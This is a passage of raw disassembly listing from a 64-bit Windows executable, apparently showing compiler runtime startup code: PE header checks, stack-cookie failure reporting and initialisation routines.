   14000174c:	c7 05 aa 68 01 00 02 	movl   $0x2,0x168aa(%rip)        # 0x140018000
   140001753:	00 00 00 
   140001756:	eb 08                	jmp    0x140001760
   140001758:	40 b7 01             	mov    $0x1,%dil
   14000175b:	40 88 7c 24 20       	mov    %dil,0x20(%rsp)
   140001760:	8a cb                	mov    %bl,%cl
   140001762:	e8 d9 06 00 00       	call   0x140001e40
   140001767:	e8 88 08 00 00       	call   0x140001ff4
   14000176c:	48 8b d8             	mov    %rax,%rbx
   14000176f:	48 83 38 00          	cmpq   $0x0,(%rax)
   140001773:	74 1e                	je     0x140001793
   140001775:	48 8b c8             	mov    %rax,%rcx
   140001778:	e8 2b 06 00 00       	call   0x140001da8
   14000177d:	84 c0                	test   %al,%al
   14000177f:	74 12                	je     0x140001793
   140001781:	45 33 c0             	xor    %r8d,%r8d
   140001784:	41 8d 50 02          	lea    0x2(%r8),%edx
   140001788:	33 c9                	xor    %ecx,%ecx
   14000178a:	48 8b 03             	mov    (%rbx),%rax
   14000178d:	ff 15 f5 ba 00 00    	call   *0xbaf5(%rip)        # 0x14000d288
   140001793:	e8 64 08 00 00       	call   0x140001ffc
   140001798:	48 8b d8             	mov    %rax,%rbx
   14000179b:	48 83 38 00          	cmpq   $0x0,(%rax)
   14000179f:	74 14                	je     0x1400017b5
   1400017a1:	48 8b c8             	mov    %rax,%rcx
   1400017a4:	e8 ff 05 00 00       	call   0x140001da8
   1400017a9:	84 c0                	test   %al,%al
   1400017ab:	74 08                	je     0x1400017b5
   1400017ad:	48 8b 0b             	mov    (%rbx),%rcx
   1400017b0:	e8 87 2f 00 00       	call   0x14000473c
   1400017b5:	e8 9e 09 00 00       	call   0x140002158
   1400017ba:	0f b7 d8             	movzwl %ax,%ebx
   1400017bd:	e8 c6 2b 00 00       	call   0x140004388
   1400017c2:	44 8b cb             	mov    %ebx,%r9d
   1400017c5:	4c 8b c0             	mov    %rax,%r8
   1400017c8:	33 d2                	xor    %edx,%edx
   1400017ca:	48 8d 0d 2f e8 ff ff 	lea    -0x17d1(%rip),%rcx        # 0x140000000
   1400017d1:	e8 2a f8 ff ff       	call   0x140001000
   1400017d6:	8b d8                	mov    %eax,%ebx
   1400017d8:	e8 bf 09 00 00       	call   0x14000219c
   1400017dd:	84 c0                	test   %al,%al
   1400017df:	74 50                	je     0x140001831
   1400017e1:	40 84 ff             	test   %dil,%dil
   1400017e4:	75 05                	jne    0x1400017eb
   1400017e6:	e8 35 2f 00 00       	call   0x140004720
   1400017eb:	33 d2                	xor    %edx,%edx
   1400017ed:	b1 01                	mov    $0x1,%cl
   1400017ef:	e8 70 06 00 00       	call   0x140001e64
   1400017f4:	8b c3                	mov    %ebx,%eax
   1400017f6:	eb 19                	jmp    0x140001811
   1400017f8:	8b d8                	mov    %eax,%ebx
   1400017fa:	e8 9d 09 00 00       	call   0x14000219c
   1400017ff:	84 c0                	test   %al,%al
   140001801:	74 36                	je     0x140001839
   140001803:	80 7c 24 20 00       	cmpb   $0x0,0x20(%rsp)
   140001808:	75 05                	jne    0x14000180f
   14000180a:	e8 01 2f 00 00       	call   0x140004710
   14000180f:	8b c3                	mov    %ebx,%eax
   140001811:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140001816:	48 83 c4 30          	add    $0x30,%rsp
   14000181a:	5f                   	pop    %rdi
   14000181b:	c3                   	ret
   14000181c:	b9 07 00 00 00       	mov    $0x7,%ecx
   140001821:	e8 e6 07 00 00       	call   0x14000200c
   140001826:	90                   	nop
   140001827:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000182c:	e8 db 07 00 00       	call   0x14000200c
   140001831:	8b cb                	mov    %ebx,%ecx
   140001833:	e8 40 2f 00 00       	call   0x140004778
   140001838:	90                   	nop
   140001839:	8b cb                	mov    %ebx,%ecx
   14000183b:	e8 f0 2e 00 00       	call   0x140004730
   140001840:	90                   	nop
   140001841:	cc                   	int3
   140001842:	cc                   	int3
   140001843:	cc                   	int3
   140001844:	48 83 ec 28          	sub    $0x28,%rsp
   140001848:	e8 97 06 00 00       	call   0x140001ee4
   14000184d:	48 83 c4 28          	add    $0x28,%rsp
   140001851:	e9 7a fe ff ff       	jmp    0x1400016d0
   140001856:	cc                   	int3
   140001857:	cc                   	int3
   140001858:	40 53                	rex push %rbx
   14000185a:	48 83 ec 20          	sub    $0x20,%rsp
   14000185e:	48 8b d9             	mov    %rcx,%rbx
   140001861:	33 c9                	xor    %ecx,%ecx
   140001863:	ff 15 87 b8 00 00    	call   *0xb887(%rip)        # 0x14000d0f0
   140001869:	48 8b cb             	mov    %rbx,%rcx
   14000186c:	ff 15 76 b8 00 00    	call   *0xb876(%rip)        # 0x14000d0e8
   140001872:	ff 15 08 b8 00 00    	call   *0xb808(%rip)        # 0x14000d080
   140001878:	48 8b c8             	mov    %rax,%rcx
   14000187b:	ba 09 04 00 c0       	mov    $0xc0000409,%edx
   140001880:	48 83 c4 20          	add    $0x20,%rsp
   140001884:	5b                   	pop    %rbx
   140001885:	48 ff 25 e4 b7 00 00 	rex.W jmp *0xb7e4(%rip)        # 0x14000d070
   14000188c:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140001891:	48 83 ec 38          	sub    $0x38,%rsp
   140001895:	b9 17 00 00 00       	mov    $0x17,%ecx
   14000189a:	ff 15 58 b8 00 00    	call   *0xb858(%rip)        # 0x14000d0f8
   1400018a0:	85 c0                	test   %eax,%eax
   1400018a2:	74 07                	je     0x1400018ab
   1400018a4:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400018a9:	cd 29                	int    $0x29
   1400018ab:	48 8d 0d 7e 62 01 00 	lea    0x1627e(%rip),%rcx        # 0x140017b30
   1400018b2:	e8 c9 01 00 00       	call   0x140001a80
   1400018b7:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1400018bc:	48 89 05 65 63 01 00 	mov    %rax,0x16365(%rip)        # 0x140017c28
   1400018c3:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   1400018c8:	48 83 c0 08          	add    $0x8,%rax
   1400018cc:	48 89 05 f5 62 01 00 	mov    %rax,0x162f5(%rip)        # 0x140017bc8
   1400018d3:	48 8b 05 4e 63 01 00 	mov    0x1634e(%rip),%rax        # 0x140017c28
   1400018da:	48 89 05 bf 61 01 00 	mov    %rax,0x161bf(%rip)        # 0x140017aa0
   1400018e1:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   1400018e6:	48 89 05 c3 62 01 00 	mov    %rax,0x162c3(%rip)        # 0x140017bb0
   1400018ed:	c7 05 99 61 01 00 09 	movl   $0xc0000409,0x16199(%rip)        # 0x140017a90
   1400018f4:	04 00 c0 
   1400018f7:	c7 05 93 61 01 00 01 	movl   $0x1,0x16193(%rip)        # 0x140017a94
   1400018fe:	00 00 00 
   140001901:	c7 05 9d 61 01 00 01 	movl   $0x1,0x1619d(%rip)        # 0x140017aa8
   140001908:	00 00 00 
   14000190b:	b8 08 00 00 00       	mov    $0x8,%eax
   140001910:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140001914:	48 8d 0d 95 61 01 00 	lea    0x16195(%rip),%rcx        # 0x140017ab0
   14000191b:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   140001922:	00 
   140001923:	b8 08 00 00 00       	mov    $0x8,%eax
   140001928:	48 6b c0 00          	imul   $0x0,%rax,%rax
   14000192c:	48 8b 0d cd 56 01 00 	mov    0x156cd(%rip),%rcx        # 0x140017000
   140001933:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140001938:	b8 08 00 00 00       	mov    $0x8,%eax
   14000193d:	48 6b c0 01          	imul   $0x1,%rax,%rax
   140001941:	48 8b 0d c0 56 01 00 	mov    0x156c0(%rip),%rcx        # 0x140017008
   140001948:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   14000194d:	48 8d 0d fc b9 00 00 	lea    0xb9fc(%rip),%rcx        # 0x14000d350
   140001954:	e8 ff fe ff ff       	call   0x140001858
   140001959:	48 83 c4 38          	add    $0x38,%rsp
   14000195d:	c3                   	ret
   14000195e:	cc                   	int3
   14000195f:	cc                   	int3
   140001960:	48 83 ec 28          	sub    $0x28,%rsp
   140001964:	b9 08 00 00 00       	mov    $0x8,%ecx
   140001969:	e8 06 00 00 00       	call   0x140001974
   14000196e:	48 83 c4 28          	add    $0x28,%rsp
   140001972:	c3                   	ret
   140001973:	cc                   	int3
   140001974:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140001978:	48 83 ec 28          	sub    $0x28,%rsp
   14000197c:	b9 17 00 00 00       	mov    $0x17,%ecx
   140001981:	ff 15 71 b7 00 00    	call   *0xb771(%rip)        # 0x14000d0f8
   140001987:	85 c0                	test   %eax,%eax
   140001989:	74 08                	je     0x140001993
   14000198b:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000198f:	8b c8                	mov    %eax,%ecx
   140001991:	cd 29                	int    $0x29
   140001993:	48 8d 0d 96 61 01 00 	lea    0x16196(%rip),%rcx        # 0x140017b30
   14000199a:	e8 71 00 00 00       	call   0x140001a10
   14000199f:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   1400019a4:	48 89 05 7d 62 01 00 	mov    %rax,0x1627d(%rip)        # 0x140017c28
   1400019ab:	48 8d 44 24 28       	lea    0x28(%rsp),%rax
   1400019b0:	48 83 c0 08          	add    $0x8,%rax
   1400019b4:	48 89 05 0d 62 01 00 	mov    %rax,0x1620d(%rip)        # 0x140017bc8
   1400019bb:	48 8b 05 66 62 01 00 	mov    0x16266(%rip),%rax        # 0x140017c28
   1400019c2:	48 89 05 d7 60 01 00 	mov    %rax,0x160d7(%rip)        # 0x140017aa0
   1400019c9:	c7 05 bd 60 01 00 09 	movl   $0xc0000409,0x160bd(%rip)        # 0x140017a90
   1400019d0:	04 00 c0 
   1400019d3:	c7 05 b7 60 01 00 01 	movl   $0x1,0x160b7(%rip)        # 0x140017a94
   1400019da:	00 00 00 
   1400019dd:	c7 05 c1 60 01 00 01 	movl   $0x1,0x160c1(%rip)        # 0x140017aa8
   1400019e4:	00 00 00 
   1400019e7:	b8 08 00 00 00       	mov    $0x8,%eax
   1400019ec:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400019f0:	48 8d 0d b9 60 01 00 	lea    0x160b9(%rip),%rcx        # 0x140017ab0
   1400019f7:	8b 54 24 30          	mov    0x30(%rsp),%edx
   1400019fb:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
   1400019ff:	48 8d 0d 4a b9 00 00 	lea    0xb94a(%rip),%rcx        # 0x14000d350
   140001a06:	e8 4d fe ff ff       	call   0x140001858
   140001a0b:	48 83 c4 28          	add    $0x28,%rsp
   140001a0f:	c3                   	ret
   140001a10:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001a15:	57                   	push   %rdi
   140001a16:	48 83 ec 40          	sub    $0x40,%rsp
   140001a1a:	48 8b d9             	mov    %rcx,%rbx
   140001a1d:	ff 15 ad b6 00 00    	call   *0xb6ad(%rip)        # 0x14000d0d0
   140001a23:	48 8b bb f8 00 00 00 	mov    0xf8(%rbx),%rdi
   140001a2a:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   140001a2f:	48 8b cf             	mov    %rdi,%rcx
   140001a32:	45 33 c0             	xor    %r8d,%r8d
   140001a35:	ff 15 9d b6 00 00    	call   *0xb69d(%rip)        # 0x14000d0d8
   140001a3b:	48 85 c0             	test   %rax,%rax
   140001a3e:	74 32                	je     0x140001a72
   140001a40:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140001a46:	48 8d 4c 24 58       	lea    0x58(%rsp),%rcx
   140001a4b:	48 8b 54 24 50       	mov    0x50(%rsp),%rdx
   140001a50:	4c 8b c8             	mov    %rax,%r9
   140001a53:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140001a58:	4c 8b c7             	mov    %rdi,%r8
   140001a5b:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140001a60:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140001a65:	33 c9                	xor    %ecx,%ecx
   140001a67:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001a6c:	ff 15 6e b6 00 00    	call   *0xb66e(%rip)        # 0x14000d0e0
   140001a72:	48 8b 5c 24 68       	mov    0x68(%rsp),%rbx
   140001a77:	48 83 c4 40          	add    $0x40,%rsp
   140001a7b:	5f                   	pop    %rdi
   140001a7c:	c3                   	ret
   140001a7d:	cc                   	int3
   140001a7e:	cc                   	int3
   140001a7f:	cc                   	int3
   140001a80:	40 53                	rex push %rbx
   140001a82:	56                   	push   %rsi
   140001a83:	57                   	push   %rdi
   140001a84:	48 83 ec 40          	sub    $0x40,%rsp
   140001a88:	48 8b d9             	mov    %rcx,%rbx
   140001a8b:	ff 15 3f b6 00 00    	call   *0xb63f(%rip)        # 0x14000d0d0
   140001a91:	48 8b b3 f8 00 00 00 	mov    0xf8(%rbx),%rsi
   140001a98:	33 ff                	xor    %edi,%edi
   140001a9a:	45 33 c0             	xor    %r8d,%r8d
   140001a9d:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140001aa2:	48 8b ce             	mov    %rsi,%rcx
   140001aa5:	ff 15 2d b6 00 00    	call   *0xb62d(%rip)        # 0x14000d0d8
   140001aab:	48 85 c0             	test   %rax,%rax
   140001aae:	74 39                	je     0x140001ae9
   140001ab0:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140001ab6:	48 8d 4c 24 68       	lea    0x68(%rsp),%rcx
   140001abb:	48 8b 54 24 60       	mov    0x60(%rsp),%rdx
   140001ac0:	4c 8b c8             	mov    %rax,%r9
   140001ac3:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   140001ac8:	4c 8b c6             	mov    %rsi,%r8
   140001acb:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140001ad0:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   140001ad5:	33 c9                	xor    %ecx,%ecx
   140001ad7:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001adc:	ff 15 fe b5 00 00    	call   *0xb5fe(%rip)        # 0x14000d0e0
   140001ae2:	ff c7                	inc    %edi
   140001ae4:	83 ff 02             	cmp    $0x2,%edi
   140001ae7:	7c b1                	jl     0x140001a9a
   140001ae9:	48 83 c4 40          	add    $0x40,%rsp
   140001aed:	5f                   	pop    %rdi
   140001aee:	5e                   	pop    %rsi
   140001aef:	5b                   	pop    %rbx
   140001af0:	c3                   	ret
   140001af1:	cc                   	int3
   140001af2:	cc                   	int3
   140001af3:	cc                   	int3
   140001af4:	e9 1f 2e 00 00       	jmp    0x140004918
   140001af9:	cc                   	int3
   140001afa:	cc                   	int3
   140001afb:	cc                   	int3
   140001afc:	40 53                	rex push %rbx
   140001afe:	48 83 ec 20          	sub    $0x20,%rsp
   140001b02:	48 8b d9             	mov    %rcx,%rbx
   140001b05:	48 8b c2             	mov    %rdx,%rax
   140001b08:	48 8d 0d 59 b8 00 00 	lea    0xb859(%rip),%rcx        # 0x14000d368
   140001b0f:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001b12:	48 89 0b             	mov    %rcx,(%rbx)
   140001b15:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140001b19:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001b1d:	0f 11 02             	movups %xmm0,(%rdx)
   140001b20:	e8 93 0b 00 00       	call   0x1400026b8
   140001b25:	48 8d 05 6c b8 00 00 	lea    0xb86c(%rip),%rax        # 0x14000d398
   140001b2c:	48 89 03             	mov    %rax,(%rbx)
   140001b2f:	48 8b c3             	mov    %rbx,%rax
   140001b32:	48 83 c4 20          	add    $0x20,%rsp
   140001b36:	5b                   	pop    %rbx
   140001b37:	c3                   	ret
   140001b38:	48 83 61 10 00       	andq   $0x0,0x10(%rcx)
   140001b3d:	48 8d 05 64 b8 00 00 	lea    0xb864(%rip),%rax        # 0x14000d3a8
   140001b44:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001b48:	48 8d 05 49 b8 00 00 	lea    0xb849(%rip),%rax        # 0x14000d398
   140001b4f:	48 89 01             	mov    %rax,(%rcx)
   140001b52:	48 8b c1             	mov    %rcx,%rax
   140001b55:	c3                   	ret
   140001b56:	cc                   	int3
   140001b57:	cc                   	int3
   140001b58:	40 53                	rex push %rbx
   140001b5a:	48 83 ec 20          	sub    $0x20,%rsp
   140001b5e:	48 8b d9             	mov    %rcx,%rbx
   140001b61:	48 8b c2             	mov    %rdx,%rax
   140001b64:	48 8d 0d fd b7 00 00 	lea    0xb7fd(%rip),%rcx        # 0x14000d368
   140001b6b:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001b6e:	48 89 0b             	mov    %rcx,(%rbx)
   140001b71:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140001b75:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001b79:	0f 11 02             	movups %xmm0,(%rdx)
   140001b7c:	e8 37 0b 00 00       	call   0x1400026b8
   140001b81:	48 8d 05 38 b8 00 00 	lea    0xb838(%rip),%rax        # 0x14000d3c0
   140001b88:	48 89 03             	mov    %rax,(%rbx)
   140001b8b:	48 8b c3             	mov    %rbx,%rax
   140001b8e:	48 83 c4 20          	add    $0x20,%rsp
   140001b92:	5b                   	pop    %rbx
   140001b93:	c3                   	ret
   140001b94:	48 83 61 10 00       	andq   $0x0,0x10(%rcx)
   140001b99:	48 8d 05 30 b8 00 00 	lea    0xb830(%rip),%rax        # 0x14000d3d0
   140001ba0:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001ba4:	48 8d 05 15 b8 00 00 	lea    0xb815(%rip),%rax        # 0x14000d3c0
   140001bab:	48 89 01             	mov    %rax,(%rcx)
   140001bae:	48 8b c1             	mov    %rcx,%rax
   140001bb1:	c3                   	ret
   140001bb2:	cc                   	int3
   140001bb3:	cc                   	int3
   140001bb4:	40 53                	rex push %rbx
   140001bb6:	48 83 ec 20          	sub    $0x20,%rsp
   140001bba:	48 8b d9             	mov    %rcx,%rbx
   140001bbd:	48 8b c2             	mov    %rdx,%rax
   140001bc0:	48 8d 0d a1 b7 00 00 	lea    0xb7a1(%rip),%rcx        # 0x14000d368
   140001bc7:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001bca:	48 89 0b             	mov    %rcx,(%rbx)
   140001bcd:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140001bd1:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001bd5:	0f 11 02             	movups %xmm0,(%rdx)
   140001bd8:	e8 db 0a 00 00       	call   0x1400026b8
   140001bdd:	48 8b c3             	mov    %rbx,%rax
   140001be0:	48 83 c4 20          	add    $0x20,%rsp
   140001be4:	5b                   	pop    %rbx
   140001be5:	c3                   	ret
   140001be6:	cc                   	int3
   140001be7:	cc                   	int3
   140001be8:	48 8d 05 79 b7 00 00 	lea    0xb779(%rip),%rax        # 0x14000d368
   140001bef:	48 89 01             	mov    %rax,(%rcx)
   140001bf2:	48 83 c1 08          	add    $0x8,%rcx
   140001bf6:	e9 4d 0b 00 00       	jmp    0x140002748
   140001bfb:	cc                   	int3
   140001bfc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001c01:	57                   	push   %rdi
   140001c02:	48 83 ec 20          	sub    $0x20,%rsp
   140001c06:	48 8d 05 5b b7 00 00 	lea    0xb75b(%rip),%rax        # 0x14000d368
   140001c0d:	48 8b f9             	mov    %rcx,%rdi
   140001c10:	48 89 01             	mov    %rax,(%rcx)
   140001c13:	8b da                	mov    %edx,%ebx
   140001c15:	48 83 c1 08          	add    $0x8,%rcx
   140001c19:	e8 2a 0b 00 00       	call   0x140002748
   140001c1e:	f6 c3 01             	test   $0x1,%bl
   140001c21:	74 0d                	je     0x140001c30
   140001c23:	ba 18 00 00 00       	mov    $0x18,%edx
   140001c28:	48 8b cf             	mov    %rdi,%rcx
   140001c2b:	e8 b4 f9 ff ff       	call   0x1400015e4
   140001c30:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001c35:	48 8b c7             	mov    %rdi,%rax
   140001c38:	48 83 c4 20          	add    $0x20,%rsp
   140001c3c:	5f                   	pop    %rdi
   140001c3d:	c3                   	ret
   140001c3e:	cc                   	int3
   140001c3f:	cc                   	int3
   140001c40:	48 83 ec 48          	sub    $0x48,%rsp
   140001c44:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001c49:	e8 ea fe ff ff       	call   0x140001b38
   140001c4e:	48 8d 15 43 48 01 00 	lea    0x14843(%rip),%rdx        # 0x140016498
   140001c55:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001c5a:	e8 11 0b 00 00       	call   0x140002770
   140001c5f:	cc                   	int3
   140001c60:	48 83 ec 48          	sub    $0x48,%rsp
   140001c64:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001c69:	e8 26 ff ff ff       	call   0x140001b94
   140001c6e:	48 8d 15 ab 48 01 00 	lea    0x148ab(%rip),%rdx        # 0x140016520
   140001c75:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001c7a:	e8 f1 0a 00 00       	call   0x140002770
   140001c7f:	cc                   	int3
   140001c80:	48 83 79 08 00       	cmpq   $0x0,0x8(%rcx)
   140001c85:	48 8d 05 ec b6 00 00 	lea    0xb6ec(%rip),%rax        # 0x14000d378
   140001c8c:	48 0f 45 41 08       	cmovne 0x8(%rcx),%rax
   140001c91:	c3                   	ret
   140001c92:	cc                   	int3
   140001c93:	cc                   	int3
   140001c94:	48 83 ec 28          	sub    $0x28,%rsp
   140001c98:	e8 0f 08 00 00       	call   0x1400024ac
   140001c9d:	85 c0                	test   %eax,%eax
   140001c9f:	74 21                	je     0x140001cc2
   140001ca1:	65 48 8b 04 25 30 00 	mov    %gs:0x30,%rax
   140001ca8:	00 00 
   140001caa:	48 8b 48 08          	mov    0x8(%rax),%rcx
   140001cae:	eb 05                	jmp    0x140001cb5
   140001cb0:	48 3b c8             	cmp    %rax,%rcx
   140001cb3:	74 14                	je     0x140001cc9
   140001cb5:	33 c0                	xor    %eax,%eax
   140001cb7:	f0 48 0f b1 0d 48 63 	lock cmpxchg %rcx,0x16348(%rip)        # 0x140018008
   140001cbe:	01 00 
   140001cc0:	75 ee                	jne    0x140001cb0
   140001cc2:	32 c0                	xor    %al,%al
   140001cc4:	48 83 c4 28          	add    $0x28,%rsp
   140001cc8:	c3                   	ret
   140001cc9:	b0 01                	mov    $0x1,%al
   140001ccb:	eb f7                	jmp    0x140001cc4
   140001ccd:	cc                   	int3
   140001cce:	cc                   	int3
   140001ccf:	cc                   	int3
   140001cd0:	40 53                	rex push %rbx
   140001cd2:	48 83 ec 20          	sub    $0x20,%rsp
   140001cd6:	0f b6 05 33 63 01 00 	movzbl 0x16333(%rip),%eax        # 0x140018010
   140001cdd:	85 c9                	test   %ecx,%ecx
   140001cdf:	bb 01 00 00 00       	mov    $0x1,%ebx
   140001ce4:	0f 44 c3             	cmove  %ebx,%eax
   140001ce7:	88 05 23 63 01 00    	mov    %al,0x16323(%rip)        # 0x140018010
   140001ced:	e8 0e 06 00 00       	call   0x140002300
   140001cf2:	e8 19 0b 00 00       	call   0x140002810
   140001cf7:	84 c0                	test   %al,%al
   140001cf9:	75 04                	jne    0x140001cff
   140001cfb:	32 c0                	xor    %al,%al
   140001cfd:	eb 14                	jmp    0x140001d13
   140001cff:	e8 50 31 00 00       	call   0x140004e54
   140001d04:	84 c0                	test   %al,%al
   140001d06:	75 09                	jne    0x140001d11
   140001d08:	33 c9                	xor    %ecx,%ecx
   140001d0a:	e8 29 0b 00 00       	call   0x140002838
   140001d0f:	eb ea                	jmp    0x140001cfb
   140001d11:	8a c3                	mov    %bl,%al
   140001d13:	48 83 c4 20          	add    $0x20,%rsp
   140001d17:	5b                   	pop    %rbx
   140001d18:	c3                   	ret
   140001d19:	cc                   	int3
   140001d1a:	cc                   	int3
   140001d1b:	cc                   	int3
   140001d1c:	40 53                	rex push %rbx
   140001d1e:	48 83 ec 20          	sub    $0x20,%rsp
   140001d22:	80 3d e8 62 01 00 00 	cmpb   $0x0,0x162e8(%rip)        # 0x140018011
   140001d29:	8b d9                	mov    %ecx,%ebx
   140001d2b:	75 67                	jne    0x140001d94
   140001d2d:	83 f9 01             	cmp    $0x1,%ecx
   140001d30:	77 6a                	ja     0x140001d9c
   140001d32:	e8 75 07 00 00       	call   0x1400024ac
   140001d37:	85 c0                	test   %eax,%eax
   140001d39:	74 28                	je     0x140001d63
   140001d3b:	85 db                	test   %ebx,%ebx
   140001d3d:	75 24                	jne    0x140001d63
   140001d3f:	48 8d 0d d2 62 01 00 	lea    0x162d2(%rip),%rcx        # 0x140018018
   140001d46:	e8 6d 2f 00 00       	call   0x140004cb8
   140001d4b:	85 c0                	test   %eax,%eax
   140001d4d:	75 10                	jne    0x140001d5f
   140001d4f:	48 8d 0d da 62 01 00 	lea    0x162da(%rip),%rcx        # 0x140018030
   140001d56:	e8 5d 2f 00 00       	call   0x140004cb8
   140001d5b:	85 c0                	test   %eax,%eax
   140001d5d:	74 2e                	je     0x140001d8d
   140001d5f:	32 c0                	xor    %al,%al
   140001d61:	eb 33                	jmp    0x140001d96
   140001d63:	66 0f 6f 05 85 b6 00 	movdqa 0xb685(%rip),%xmm0        # 0x14000d3f0
   140001d6a:	00 
   140001d6b:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140001d6f:	f3 0f 7f 05 a1 62 01 	movdqu %xmm0,0x162a1(%rip)        # 0x140018018
   140001d76:	00 
   140001d77:	48 89 05 aa 62 01 00 	mov    %rax,0x162aa(%rip)        # 0x140018028
   140001d7e:	f3 0f 7f 05 aa 62 01 	movdqu %xmm0,0x162aa(%rip)        # 0x140018030
   140001d85:	00 
   140001d86:	48 89 05 b3 62 01 00 	mov    %rax,0x162b3(%rip)        # 0x140018040
   140001d8d:	c6 05 7d 62 01 00 01 	movb   $0x1,0x1627d(%rip)        # 0x140018011
   140001d94:	b0 01                	mov    $0x1,%al
   140001d96:	48 83 c4 20          	add    $0x20,%rsp
   140001d9a:	5b                   	pop    %rbx
   140001d9b:	c3                   	ret
   140001d9c:	b9 05 00 00 00       	mov    $0x5,%ecx
   140001da1:	e8 66 02 00 00       	call   0x14000200c
   140001da6:	cc                   	int3
   140001da7:	cc                   	int3
   140001da8:	48 83 ec 18          	sub    $0x18,%rsp
   140001dac:	4c 8b c1             	mov    %rcx,%r8
   140001daf:	b8 4d 5a 00 00       	mov    $0x5a4d,%eax
   140001db4:	66 39 05 45 e2 ff ff 	cmp    %ax,-0x1dbb(%rip)        # 0x140000000
   140001dbb:	75 78                	jne    0x140001e35
   140001dbd:	48 63 0d 78 e2 ff ff 	movslq -0x1d88(%rip),%rcx        # 0x14000003c
   140001dc4:	48 8d 15 35 e2 ff ff 	lea    -0x1dcb(%rip),%rdx        # 0x140000000
   140001dcb:	48 03 ca             	add    %rdx,%rcx
   140001dce:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140001dd4:	75 5f                	jne    0x140001e35
   140001dd6:	b8 0b 02 00 00       	mov    $0x20b,%eax
   140001ddb:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   140001ddf:	75 54                	jne    0x140001e35
   140001de1:	4c 2b c2             	sub    %rdx,%r8
   140001de4:	0f b7 41 14          	movzwl 0x14(%rcx),%eax
   140001de8:	48 8d 51 18          	lea    0x18(%rcx),%rdx
   140001dec:	48 03 d0             	add    %rax,%rdx
   140001def:	0f b7 41 06          	movzwl 0x6(%rcx),%eax
   140001df3:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   140001df7:	4c 8d 0c ca          	lea    (%rdx,%rcx,8),%r9
   140001dfb:	48 89 14 24          	mov    %rdx,(%rsp)
   140001dff:	49 3b d1             	cmp    %r9,%rdx
   140001e02:	74 18                	je     0x140001e1c
   140001e04:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   140001e07:	4c 3b c1             	cmp    %rcx,%r8
   140001e0a:	72 0a                	jb     0x140001e16
   140001e0c:	8b 42 08             	mov    0x8(%rdx),%eax
   140001e0f:	03 c1                	add    %ecx,%eax
   140001e11:	4c 3b c0             	cmp    %rax,%r8
   140001e14:	72 08                	jb     0x140001e1e
   140001e16:	48 83 c2 28          	add    $0x28,%rdx
   140001e1a:	eb df                	jmp    0x140001dfb
   140001e1c:	33 d2                	xor    %edx,%edx
   140001e1e:	48 85 d2             	test   %rdx,%rdx
   140001e21:	75 04                	jne    0x140001e27
   140001e23:	32 c0                	xor    %al,%al
   140001e25:	eb 14                	jmp    0x140001e3b
   140001e27:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   140001e2b:	7d 04                	jge    0x140001e31
   140001e2d:	32 c0                	xor    %al,%al
   140001e2f:	eb 0a                	jmp    0x140001e3b
   140001e31:	b0 01                	mov    $0x1,%al
   140001e33:	eb 06                	jmp    0x140001e3b
   140001e35:	32 c0                	xor    %al,%al
   140001e37:	eb 02                	jmp    0x140001e3b
   140001e39:	32 c0                	xor    %al,%al
   140001e3b:	48 83 c4 18          	add    $0x18,%rsp
   140001e3f:	c3                   	ret
   140001e40:	40 53                	rex push %rbx
   140001e42:	48 83 ec 20          	sub    $0x20,%rsp
   140001e46:	8a d9                	mov    %cl,%bl
   140001e48:	e8 5f 06 00 00       	call   0x1400024ac
   140001e4d:	33 d2                	xor    %edx,%edx
   140001e4f:	85 c0                	test   %eax,%eax
   140001e51:	74 0b                	je     0x140001e5e
   140001e53:	84 db                	test   %bl,%bl
   140001e55:	75 07                	jne    0x140001e5e
